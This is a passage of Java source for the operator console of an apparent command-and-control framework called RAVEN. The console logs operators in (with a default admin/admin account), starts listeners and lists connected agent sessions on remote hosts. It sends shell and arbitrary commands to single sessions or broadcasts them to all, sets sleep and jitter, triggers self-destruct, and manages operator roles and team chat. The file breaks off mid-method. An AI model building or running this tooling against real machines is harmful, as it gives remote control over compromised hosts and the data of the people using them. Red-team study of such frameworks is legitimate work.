package com.raven.interfaces.CLI;

import com.raven.core.command.AgentCommandDispatcher;
import com.raven.core.command.AgentCommandDispatcher.CommandResult;
import com.raven.core.command.CommandRegistry;
import com.raven.core.command.CommandRegistry.Category;
import com.raven.core.command.CommandRegistry.CommandDef;
import com.raven.core.command.ExportCommand;
import com.raven.core.database.TeamDatabase;
import com.raven.core.database.TeamDatabase.OperatorRole;
import com.raven.core.output.EventLog;
import com.raven.core.output.Logger;
import com.raven.core.output.PromptManager;
import com.raven.core.server.ListenerMode;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.interfaces.CLI.core.web.WebPanelManager;
import com.raven.utils.AnsiColor;
import com.raven.utils.ServerConfig;
import com.raven.utils.SystemHelper;
import com.raven.utils.TerminalHelper;
import java.io.BufferedReader;
import java.io.Console;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public final class CLI {

    private static final String PROMPT_TOP = AnsiColor.Red + "┌──{" + AnsiColor.White + "RAVEN" + AnsiColor.Red + "}" + AnsiColor.Reset;
    private static final String PROMPT_BOTTOM = AnsiColor.Red + "└─" + AnsiColor.White + ">>" + AnsiColor.Reset + " ";

    private final ServerConfig Config;
    private final TeamDatabase Db;
    private final EventLog Log;
    private final ExportCommand Export;

    private RavenServer Server;
    private Instant ServerStartTime;
    private boolean IsTeamMode;
    private ListenerMode ActiveMode = ListenerMode.MULTI;

    private String OperatorName;
    private OperatorRole OperatorRole;
    private volatile boolean Running = true;

    private static volatile RavenServer SharedServer;
    private static volatile Instant SharedServerStart;
    private static final Object ServerLock = new Object();

    private final WebPanelManager WebPanelManager;

    public CLI(ServerConfig Config) {
        this.Config = Config;
        this.Db = TeamDatabase.Connect(Config);
        this.Log = new EventLog(Config.GetMaxLogEntries());
        this.Export = new ExportCommand(Db, Log);
        this.WebPanelManager = new WebPanelManager(Config);
        PromptManager.SetPrompt(PROMPT_BOTTOM);
    }

    public void Run(String Host, int Port, ListenerMode Mode) {
        this.ActiveMode = Mode;
        this.IsTeamMode = false;
        this.OperatorName = Config.GetAdminUsername();
        this.OperatorRole = OperatorRole.SUPER;
        WebPanelManager.SetActiveMode(Mode);
        if (!StartListener(Host, Port, Mode)) return;
        RunLoop();
    }

    public void RunTeamServer(String Host, int Port, ListenerMode Mode) {
        this.ActiveMode = Mode;
        this.IsTeamMode = true;
        WebPanelManager.SetActiveMode(Mode);
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        if (!Login(Reader)) return;
        if (!StartListener(Host, Port, Mode)) return;
        RunLoop();
    }

    private boolean Login(BufferedReader Reader) {
        System.out.println(TerminalHelper.Box("TEAMSERVER LOGIN"));
        System.out.println();
        Logger.Custom("  %sDefault: admin / admin (change after first login)%s%n%n", AnsiColor.White, AnsiColor.Reset);
        for (int Try = 1; Try <= 3; Try++) {
            try {
                Logger.Custom("  %sUsername:%s ", AnsiColor.Red, AnsiColor.Reset);
                System.out.flush();
                String User = Reader.readLine();
                if (User == null) return false;
                User = User.trim();
                Logger.Custom("  %sPassword:%s ", AnsiColor.Red, AnsiColor.Reset);
                System.out.flush();
                String Pass;
                Console C = System.console();
                if (C != null) {
                    char[] Chars = C.readPassword();
                    Pass = Chars != null ? new String(Chars) : "";
                } else {
                    Pass = Reader.readLine();
                }
                if (Pass == null) return false;
                if (!Db.ValidateOperator(User, TeamDatabase.HashPassword(Pass))) {
                    Logger.Custom("  %sInvalid credentials — attempt %d/3%s%n%n", AnsiColor.Red, Try, AnsiColor.Reset);
                    continue;
                }
                OperatorName = User;
                OperatorRole = Db.GetOperatorRole(User);
                Db.UpdateLastSeen(User);
                Logger.Info("Operator login: " + User + " [" + OperatorRole + "]");
                Logger.Custom("  %n%sWelcome, %s [%s]%s%n", AnsiColor.Green, User, OperatorRole, AnsiColor.Reset);
                Logger.Custom("  %sPermissions:%s %s%n%n", AnsiColor.Red, AnsiColor.White, OperatorRole.PermissionString());
                return true;
            } catch (IOException Ex) {
                return false;
            }
        }
        Logger.Error("authentication failed");
        return false;
    }

    private boolean StartListener(String Host, int Port, ListenerMode Mode) {
        if (IsTeamMode) {
            synchronized (ServerLock) {
                if (SharedServer != null && SharedServer.IsRunning()) {
                    Server = SharedServer;
                    ServerStartTime = SharedServerStart;
                    Logger.Info("Operator " + OperatorName + " joined existing listener on " + Host + ":" + Port);
                    return true;
                }
                RavenServer S = new RavenServer(Host, Port, Mode, Config);
                S.AddEventListener(this::HandleEvent);
                if (!S.StartServer()[0]) {
                    if (IsPortBound(Host, Port)) {
                        Logger.Info(OperatorName + " attached to listener on " + Host + ":" + Port + " (cross-process)");
                        ServerStartTime = Instant.now();
                        return true;
                    }
                    Logger.Error("failed to start listener");
                    return false;
                }
                SharedServer = S;
                SharedServerStart = Instant.now();
                Server = SharedServer;
                ServerStartTime = SharedServerStart;
                Thread T = new Thread(SharedServer::AcceptConnections, "AcceptConnections");
                T.setDaemon(true);
                T.start();
                return true;
            }
        }
        Server = new RavenServer(Host, Port, Mode, Config);
        Server.AddEventListener(this::HandleEvent);
        if (!Server.StartServer()[0]) {
            Logger.Error("failed to start listener");
            return false;
        }
        ServerStartTime = Instant.now();
        Thread T = new Thread(Server::AcceptConnections, "AcceptConnections");
        T.setDaemon(true);
        T.start();
        return true;
    }

    private void HandleEvent(com.raven.core.event.EventManager.EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case ServerStarted -> AddLog(" server listening on " + Data.get("Host") + ":" + Data.get("Port"), true);
            case AgentConnected -> AddLog("[" + Data.get("AgentName") + "] session-" + Data.get("ID") + " key: " + Data.get("SessionKey") + " (" + Data.get("OS") + ")", true);
            case AgentDisconnected -> AddLog("session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"), true);
            case AgentRemoved -> AddLog("session-" + Data.get("ID") + " removed", false);
            case Error -> AddLog("Error: " + Data.get("Message"), true);
        }
    }

    private void AddLog(String Msg, boolean Print) {
        Log.Add(Msg, Print);
    }

    private void RunLoop() {
        try {
            Thread.sleep(300);
        } catch (InterruptedException Ignored) {}
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        int LastCount = Log.Count();
        while (Running) {
            try {
                int Current = Log.Count();
                if (Current > LastCount) {
                    Logger.Info(Current - LastCount + " new event(s) - type 'logs' to view");
                    LastCount = Current;
                }
                System.out.println();
                System.out.println(PROMPT_TOP);
                System.out.print(PROMPT_BOTTOM);
                System.out.flush();
                PromptManager.MarkVisible(true);
                String Input = Reader.readLine();
                PromptManager.MarkVisible(false);
                if (Input == null || Input.isBlank()) continue;
                String[] Parts = Input.trim().split("\\s+", 4);
                String Cmd = Parts[0].toLowerCase();
                int Updated = Dispatch(Cmd, Parts);
                if (Updated < 0) break;
                if (Updated > 0) LastCount = Log.Count();
            } catch (IOException Ex) {
                break;
            }
        }
        Shutdown();
    }

    private int Dispatch(String Cmd, String[] P) {
        switch (Cmd) {
            // ── SYSTEM ────────────────────────────────────────────────────────
            case "exit", "quit" -> {
                Logger.Debug("shutting down");
                return -1;
            }
            case "help" -> ShowHelp();
            case "clear" -> {
                TerminalHelper.Clear();
                return 1;
            }
            // ── SERVER ────────────────────────────────────────────────────────
            case "status" -> {
                long Uptime = ServerStartTime != null ? java.time.Duration.between(ServerStartTime, java.time.Instant.now()).getSeconds() : 0;
                System.out.println(TerminalHelper.Box("SERVER STATUS"));
                System.out.println();
                if (Server != null && Server.IsRunning()) {
                    Logger.Custom("  %sStatus    %sONLINE%n", AnsiColor.Red, AnsiColor.Green);
                    Logger.Custom("  %sMode      %s%s%n", AnsiColor.Red, AnsiColor.White, ActiveMode.name());
                    Logger.Custom("  %sAddress   %s%s:%d%n", AnsiColor.Red, AnsiColor.White, Server.GetHost(), Server.GetPort());
                    Logger.Custom("  %sSessions  %s%d%n", AnsiColor.Red, AnsiColor.White, Server.GetSessions().Count());
                } else {
                    Logger.Custom("  %sStatus    %sOFFLINE%n", AnsiColor.Red, AnsiColor.Red);
                }
                Logger.Custom("  %sUptime    %s%s%n", AnsiColor.Red, AnsiColor.White, SystemHelper.FormatUptime(Uptime));
                Logger.Custom("  %sDatabase  %s%s (%s)%n%n", AnsiColor.Red, AnsiColor.White, Db.IsConnected() ? "connected" : "memory", Config.GetDatabaseType());
                if (IsTeamMode) Logger.Custom("  %sOperator  %s%s [%s]%n%n", AnsiColor.Red, AnsiColor.White, OperatorName, OperatorRole);
            }
            case "logs" -> {
                System.out.println(TerminalHelper.Box("RECENT LOGS"));
                System.out.println();
                List<String> Entries = Log.GetLast(30);
                if (Entries.isEmpty()) Logger.Info("  no logs");
                else Entries.forEach(Entry -> Logger.Custom("  %s%s%s%n", AnsiColor.White, Entry, AnsiColor.Reset));
                System.out.println();
                return 1;
            }
            // ── WEB PANEL ─────────────────────────────────────────────────────
            case "webstart" -> {
                String WebHost = P.length > 1 ? P[1] : Config.GetWebHost();
                int WebPort = P.length > 2 ? ParseIntSafe(P[2], Config.GetWebPort()) : Config.GetWebPort();
                WebPanelManager.Start(WebHost, WebPort, Server, ServerStartTime);
            }
            case "webstop" -> WebPanelManager.Stop();
            case "webstatus" -> WebPanelManager.ShowStatus();
            // ── SESSION LIST ──────────────────────────────────────────────────
            case "sessions", "agents" -> ShowSessions();
            case "stats" -> ShowStats();
            case "tasks" -> ShowTasks();
            // ── SESSION CONTROL ───────────────────────────────────────────────
            case "use" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("use"));
                    break;
                }
                try {
                    Interactive(ParseInt(P[1]));
                    return 1;
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "exec" -> {
                if (!CanExecute()) {
                    Logger.Warn("insufficient permissions");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("exec"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), BuildArgs(P, 2));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "shell" -> {
                if (!CanExecute()) {
                    Logger.Warn("insufficient permissions");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("shell"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "shell " + BuildArgs(P, 2));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "broadcast" -> {
                if (!CanExecute()) {
                    Logger.Warn("insufficient permissions");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("broadcast"));
                    break;
                }
                String BcastTarget = P[1].toLowerCase();
                String BcastCmd = BuildArgs(P, 2);
                if (BcastTarget.equals("all")) {
                    BroadcastAll(BcastCmd);
                } else {
                    List<Integer> Ids = ParseIds(BcastTarget);
                    if (Ids.isEmpty()) {
                        Logger.Warn("no valid session IDs in: " + P[1]);
                        break;
                    }
                    Broadcast(Ids, BcastCmd);
                }
            }
            case "kill" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("kill"));
                    break;
                }
                if (Server == null || !Server.IsRunning()) {
                    Logger.Warn("server not running");
                    break;
                }
                try {
                    int KillId = ParseInt(P[1]);
                    if (Server.GetSessions().Get(KillId).isEmpty()) {
                        Logger.Warn("session-" + KillId + " not found");
                        break;
                    }
                    Server.RemoveSession(KillId);
                    AddLog("[KILL] session-" + KillId + " by " + OperatorName, true);
                    Logger.Custom("  %s✔ session-%d terminated%s%n%n", AnsiColor.Green, KillId, AnsiColor.Reset);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sysinfo", "info" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("sysinfo"));
                    break;
                }
                try {
                    ShowSessionInfo(ParseInt(P[1]));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "ping", "reconnect" -> {
                if (P.length < 2) {
                    Logger.Info(Usage(Cmd));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), Cmd);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "self-destruct", "selfdestruct" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 2) {
                    Logger.Info(Usage("self-destruct"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "self-destruct");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sleep" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("sleep"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "sleep " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "jitter" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("jitter"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "jitter " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            // ── TASK ──────────────────────────────────────────────────────────
            case "history" -> {
                int AgentId = P.length > 1 ? ParseIntSafe(P[1], 0) : 0;
                int Limit = P.length > 2 ? ParseIntSafe(P[2], 50) : 50;
                ShowCommandHistory(AgentId, Limit);
            }
            case "sessions-history", "sesshistory" -> {
                int Limit = P.length > 1 ? ParseIntSafe(P[1], 50) : 50;
                List<Map<String, Object>> Sessions = Db.GetSessionHistory(Limit);
                System.out.println(TerminalHelper.Box("SESSION HISTORY (last " + Limit + ")"));
                System.out.println();
                if (Sessions.isEmpty()) {
                    Logger.Info("  no session history");
                    System.out.println();
                    break;
                }
                Sessions.forEach(Session -> Logger.Custom("  %s%s%s%n", AnsiColor.White, Session, AnsiColor.Reset));
                System.out.println();
            }
            case "note" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("note"));
                    break;
                }
                try {
                    int NoteId = ParseInt(P[1]);
                    Db.SetAgentNote(NoteId, BuildArgs(P, 2));
                    Logger.Custom("  %s✔ note saved for session-%d%s%n%n", AnsiColor.Green, NoteId, AnsiColor.Reset);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "getnote" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("getnote"));
                    break;
                }
                try {
                    int NoteId = ParseInt(P[1]);
                    String Note = Db.GetAgentNote(NoteId);
                    Logger.Custom("  %sNote [session-%d]:%s %s%n%n", AnsiColor.Red, NoteId, AnsiColor.White, Note.isBlank() ? "(empty)" : Note);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            // ── OPERATOR ──────────────────────────────────────────────────────
            case "listopt", "listoperators" -> ShowOperators();
            case "addopt", "addoperator" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("addopt"));
                    break;
                }
                String[] AddParts = BuildArgs(P, 2).split("\\s+", 2);
                String AddPass = AddParts[0];
                String AddRole = AddParts.length > 1 ? AddParts[1] : "OPERATOR";
                if (AddPass.length() < 8) {
                    Logger.Warn("password must be at least 8 characters");
                    break;
                }
                OperatorRole NewRole = OperatorRole.FromString(AddRole);
                if (NewRole == OperatorRole.SUPER && !OperatorRole.IsSuperAdmin()) {
                    Logger.Warn("only SUPER can create SUPER operators");
                    break;
                }
                if (Db.CreateOperator(P[1], TeamDatabase.HashPassword(AddPass), NewRole)) Logger.Custom("  %s✔ operator created: %s [%s]%s%n%n", AnsiColor.Green, P[1], NewRole, AnsiColor.Reset);
                else Logger.Warn("username already exists: " + P[1]);
            }
            case "delopt", "deleteoperator" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 2) {
                    Logger.Info(Usage("delopt"));
                    break;
                }
                if (P[1].equalsIgnoreCase(Config.GetAdminUsername())) {
                    Logger.Warn("cannot delete the admin account");
                    break;
                }
                if (Db.DeleteOperator(P[1])) Logger.Custom("  %s✔ deleted: %s%s%n%n", AnsiColor.Green, P[1], AnsiColor.Reset);
                else Logger.Warn("operator not found: " + P[1]);
            }
            case "kick", "kickopt" -> {
                if (OperatorRole == null || !OperatorRole.CanKickOperator()) {
                    Logger.Warn("SUPER role required");
                    break;
                }
                if (P.length < 2) {
                    Logger.Info(Usage("kick"));
                    break;
                }
                if (P[1].equalsIgnoreCase(Config.GetAdminUsername())) {
                    Logger.Warn("cannot kick the admin account");
                    break;
                }
                if (P[1].equals(OperatorName)) {
                    Logger.Warn("cannot kick yourself");
                    break;
                }
                if (Db.DeleteOperator(P[1])) Logger.Custom("  %s✔ kicked: %s%s%n%n", AnsiColor.Green, P[1], AnsiColor.Reset);
                else Logger.Warn("operator not found: " + P[1]);
            }
            case "setrole", "changerole" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("setrole"));
                    break;
                }
                if (P[1].equalsIgnoreCase(Config.GetAdminUsername())) {
                    Logger.Warn("cannot change the admin role");
                    break;
                }
                OperatorRole SetRole = OperatorRole.FromString(P[2]);
                if (Db.UpdateOperatorRole(P[1], SetRole)) Logger.Custom("  %s✔ role updated: %s → %s%s%n%n", AnsiColor.Green, P[1], SetRole, AnsiColor.Reset);
                else Logger.Warn("operator not found: " + P[1]);
            }
            case "passwd", "changepassword" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("passwd"));
                    break;
                }
                if (P[2].length() < 8) {
                    Logger.Warn("password must be at least 8 characters");
                    break;
                }
                if (Db.UpdateOperatorPassword(P[1], TeamDatabase.HashPassword(P[2]))) Logger.Custom("  %s✔ password updated: %s%s%n%n", AnsiColor.Green, P[1], AnsiColor.Reset);
                else Logger.Warn("operator not found: " + P[1]);
            }
            // ── CHAT ──────────────────────────────────────────────────────────
            case "chat" -> ShowChat();
            case "chathistory", "chatlog" -> ShowChatHistory(50);
            case "ch" -> {
                if (!IsTeamMode) {
                    Logger.Warn("team mode required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("ch"));
                    break;
                }
                Db.SaveChatLog(OperatorName, P[1], BuildArgs(P, 2));
                Logger.Custom("  %s→ %s%s %s%n", AnsiColor.Green, P[1], AnsiColor.Reset, BuildArgs(P, 2));
            }
            case "gc" -> {
                if (!IsTeamMode) {
                    Logger.Warn("team mode required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("gc"));
                    break;
                }
                String GcTarget = P[1].toLowerCase();
                String GcMsg = BuildArgs(P, 2);
                if (GcTarget.equals("all")) {
                    Db.SaveChatLog(OperatorName, "all", GcMsg);
                } else {
                    for (String Recipient : GcTarget.split(",")) {
                        String Trimmed = Recipient.trim();
                        if (!Trimmed.isEmpty()) Db.SaveChatLog(OperatorName, Trimmed, GcMsg);
                    }
                }
                Logger.Custom("  %s→ %s%s %s%n", AnsiColor.Green, GcTarget, AnsiColor.Reset, GcMsg);
            }
            // ── EXPORT ────────────────────────────────────────────────────────
            case "export" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("export"));
                    break;
                }
                Export.Run(P[1], P[2]);
            }
            // ── DEFAULT: agent-routed commands ────────────────────────────────
            default -> {
                if (!CommandRegistry.Has(Cmd)) {
                    Logger.Error("unknown command: " + Cmd);
                    Logger.Info("type 'help' for available commands");
                    break;
                }
                if (P.length < 2) {
                    Logger.Info(Usage(Cmd));
                    break;
                }
                try {
                    int SessionId = ParseInt(P[1]);
                    String Arguments = BuildArgs(P, 2);
                    String FullInput = Arguments.isBlank() ? Cmd : Cmd + " " + Arguments;
                    Execute(SessionId, FullInput);
                } catch (NumberFormatException Exception) {
                    Logger.Warn("invalid session ID — usage: " + Usage(Cmd));
                }
            }
        }
        return 0;
    }

    private void ShowHelp() {
        System.out.println(TerminalHelper.Box("COMMAND REFERENCE"));
        System.out.println();
        if (IsTeamMode && OperatorName != null) {
            Logger.Custom("  %s[TEAMSERVER]%s  Operator: %s%s%s  Role: %s%s%s%n", AnsiColor.Red, AnsiColor.Reset, AnsiColor.White, OperatorName, AnsiColor.Reset, AnsiColor.White, OperatorRole != null ? OperatorRole.name() : "?", AnsiColor.Reset);
            if (OperatorRole != null) Logger.Custom("  %sPermissions:%s %s%n%n", AnsiColor.Red, AnsiColor.White, OperatorRole.PermissionString());
        }
        for (Category Cat : Category.values()) {
            List<CommandDef> Cmds = CommandRegistry.ByCategory(Cat);
            if (Cmds.isEmpty()) continue;
            Logger.Custom("  %s%s%s%n", AnsiColor.Red, Cat.name(), AnsiColor.Reset);
            for (CommandDef Def : Cmds) {
                if (Def.RequireTeamMode() && !IsTeamMode) continue;
                Logger.Custom("    %s%-42s%s %s%n", AnsiColor.White, Def.Usage(), AnsiColor.Reset, Def.Description());
            }
            System.out.println();
        }
    }

    private void ShowSessions() {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        List<Session> All = Server.GetSessions().GetAll();
        System.out.println(TerminalHelper.Box("ACTIVE SESSIONS (" + All.size() + ")"));
        System.out.println();
        if (All.isEmpty()) {
            Logger.Info("  no active sessions");
            System.out.println();
            return;
        }
        Logger.Custom("  %s%-5s %-14s %-16s %-14s %-10s %-10s %s%s%n", AnsiColor.Red, "ID", "NAME", "IP", "TYPE", "OS", "USER", "KEY", AnsiColor.Reset);
        System.out.println(TerminalHelper.Divider());
        for (Session S : All) {
            Logger.Custom("  %s#%-4d %-14s %-16s %-14s %-10s %-10s %s%s%n", AnsiColor.White, S.GetId(), TerminalHelper.Truncate(S.GetAgentName(), 14), TerminalHelper.Truncate(S.GetAgentIp(), 16), S.GetSessionType().name(), TerminalHelper.Truncate(S.GetOs(), 10), TerminalHelper.Truncate(S.GetUser(), 10), S.GetSessionKey(), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void ShowStats() {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        int Count = Server.GetSessions().Count();
        System.out.println(TerminalHelper.Box("SESSION STATS"));
        System.out.println();
        Logger.Custom("  %sTotal Active%s  %d%n", AnsiColor.Red, AnsiColor.White, Count);
        System.out.println();
    }

    private void ShowTasks() {
        System.out.println(TerminalHelper.Box("TASK QUEUE"));
        System.out.println();
        Logger.Info("  (task queue display not implemented — extend here)");
        System.out.println();
    }

    private void ShowSessionInfo(int Id) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        Session S = Server.GetSessions().Get(Id).orElse(null);
        if (S == null) {
            Logger.Warn("session not found: " + Id);
            return;
        }
        System.out.println(TerminalHelper.Box("SESSION INFO — #" + Id));
        System.out.println();
        Logger.Custom("  %sID          %s%d%n", AnsiColor.Red, AnsiColor.White, S.GetId());
        Logger.Custom("  %sName        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetAgentName());
        Logger.Custom("  %sHostname    %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetHostname());
        Logger.Custom("  %sOS          %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetOs());
        Logger.Custom("  %sUser        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetUser());
        Logger.Custom("  %sArch        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetArch());
        Logger.Custom("  %sIP          %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetAgentIp());
        Logger.Custom("  %sType        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetSessionType().name());
        Logger.Custom("  %sEncrypted   %s%b%n", AnsiColor.Red, AnsiColor.White, S.IsEncrypted());
        Logger.Custom("  %smTLS        %s%b%n", AnsiColor.Red, AnsiColor.White, S.IsMtlsEnabled());
        Logger.Custom("  %sJoined      %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetJoinedAt());
        Logger.Custom("  %sNote        %s%s%n", AnsiColor.Red, AnsiColor.White, Db.GetAgentNote(Id));
        System.out.println();
    }

    private void Interactive(int Id) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        Session S = Server.GetSessions().Get(Id).orElse(null);
        if (S == null) {
            Logger.Warn("session not found: " + Id);
            return;
        }
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        Logger.Custom("  %sInteractive shell — session-%d  (type 'back' to return)%s%n%n", AnsiColor.Green, Id, AnsiColor.Reset);
        while (true) {
            System.out.print(AnsiColor.Red + "[session-" + Id + "] " + AnsiColor.White + ">> " + AnsiColor.Reset);
            System.out.flush();
            try {
                String Input = Reader.readLine();
                if (Input == null || Input.equalsIgnoreCase("back") || Input.equalsIgnoreCase("exit")) break;
                if (Input.isBlank()) continue;
                Execute(Id, Input);
            } catch (IOException Ex) {
                break;
            }
        }
        Logger.Custom("  %sReturned to main shell%s%n%n", AnsiColor.White, AnsiColor.Reset);
    }

    private void Execute(int SessionId, String UserCommand) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        AddLog("[>] [" + OperatorName + "] session-" + SessionId + " » " + UserCommand, false);
        CommandResult Result = new AgentCommandDispatcher(Server, Db, OperatorName).Dispatch(SessionId, UserCommand);
        if (Result.Success()) System.out.println(TerminalHelper.OutputBox(Result.Output()));
        else Logger.Error(Result.Output());
        System.out.println();
    }

    private void Broadcast(List<Integer> Ids, String UserCommand) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        AddLog("[BROADCAST] [" + OperatorName + "] > " + Ids.size() + " agents » " + UserCommand, true);
        Map<Integer, CommandResult> Results = new AgentCommandDispatcher(Server, Db, OperatorName).BroadcastDispatch(Ids, UserCommand);
        Results.forEach((SessionId, Result) -> Logger.Custom("  %s[session-%d] %s%s%n", Result.Success() ? AnsiColor.Green : AnsiColor.Red, SessionId, Result.Success() ? "✔ " : "✘ ", Result.Output()));
    }

    private void BroadcastAll(String UserCommand) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        AddLog("[BROADCAST-ALL] [" + OperatorName + "] > " + Server.GetSessions().Count() + " agents » " + UserCommand, true);
        Map<Integer, CommandResult> Results = new AgentCommandDispatcher(Server, Db, OperatorName).BroadcastAllDispatch(UserCommand);
        Results.forEach((SessionId, Result) -> Logger.Custom("  %s[session-%d] %s%s%n", Result.Success() ? AnsiColor.Green : AnsiColor.Red, SessionId, Result.Success() ? "✔ " : "✘ ", Result.Output()));
    }

    private void ShowCommandHistory(int AgentId, int Limit) {
        List<Map<String, Object>> Hist = Db.GetCommandHistory(AgentId, Limit);
        System.out.println(TerminalHelper.Box("COMMAND HISTORY (last " + Limit + (AgentId > 0 ? " — session-" + AgentId : "") + ")"));
        System.out.println();
        if (Hist.isEmpty()) {
            Logger.Info("  no history");
            System.out.println();
            return;
        }
        Logger.Custom("  %s%-5s %-12s %-10s %-36s %s%s%n", AnsiColor.Red, "SID", "OPERATOR", "STATUS", "COMMAND", "TIMESTAMP", AnsiColor.Reset);
        System.out.println(TerminalHelper.Divider());
        for (Map<String, Object> H : Hist) {
            boolean Ok = Boolean.parseBoolean(H.getOrDefault("Success", "false").toString());
            String Cmd = TerminalHelper.Truncate(H.getOrDefault("Command", "").toString(), 36);
            Logger.Custom("  %s%-5s %-12s %s%-10s%s %-36s %s%s%n", AnsiColor.White, H.getOrDefault("AgentId", "?"), TerminalHelper.Truncate(H.getOrDefault("Operator", "?").toString(), 12), Ok ? AnsiColor.Green : AnsiColor.Red, Ok ? "✔ ok" : "✘ fail", AnsiColor.White, Cmd, H.getOrDefault("Timestamp", ""), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void ShowOperators() {
        List<Map<String, Object>> Ops = Db.GetOperators();
        System.out.println(TerminalHelper.Box("OPERATORS (" + Ops.size() + ")"));
        System.out.println();
        Logger.Custom("  %s%-18s %-14s %-30s %-20s%s%n", AnsiColor.Green, "USERNAME", "ROLE", "PERMISSIONS", "LAST SEEN", AnsiColor.Reset);
        System.out.println(TerminalHelper.Divider());
        for (Map<String, Object> Op : Ops) {
            OperatorRole R = OperatorRole.FromString(Op.get("Role").toString());
            boolean Me = Op.get("Username").toString().equals(OperatorName);
            String Tag = Me ? AnsiColor.Green + " ◀ YOU" + AnsiColor.White : "";
            Logger.Custom("  %s%-18s %-14s %-30s %-20s%s%s%n", AnsiColor.White, Op.get("Username"), R.name(), R.PermissionString(), Op.getOrDefault("LastSeen", "Never"), Tag, AnsiColor.Reset);
        }
        System.out.println();
        Logger.Custom("  %sRole Reference:%s%n", AnsiColor.Red, AnsiColor.Reset);
        for (OperatorRole R : OperatorRole.values()) Logger.Custom("    %s%-14s%s %s%n", AnsiColor.White, R.name(), AnsiColor.Reset, R.PermissionString());
        System.out.println();
    }

    private void ShowChat() {
        List<Map<String, Object>> Msgs = Db.GetChatLogs(100);
        System.out.println(TerminalHelper.Box("CHAT MESSAGES"));
        System.out.println();
        if (Msgs.isEmpty()) {
            Logger.Info("  no messages");
            System.out.println();
            return;
        }
        for (Map<String, Object> M : Msgs) {
            String From = M.getOrDefault("from_operator", "?").toString();
            String To = M.getOrDefault("to_operators", "all").toString();
            String Ts = M.getOrDefault("timestamp", "").toString();
            if (Ts.length() > 19) Ts = Ts.substring(11, 19);
            boolean Mine = From.equals(OperatorName);
            Logger.Custom("  %s[%s] %s%s%s [%s]: %s%s%n", Mine ? AnsiColor.Green : AnsiColor.White, Ts, Mine ? AnsiColor.Green : AnsiColor.Red, From, AnsiColor.Reset, To.equals("all") ? "all" : "→ " + To, M.getOrDefault("message", ""), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void ShowChatHistory(int Limit) {
        List<Map<String, Object>> Msgs = Db.GetChatLogs(Limit);
        System.out.println(TerminalHelper.Box("CHAT HISTORY (DB — last " + Limit + ")"));
        System.out.println();
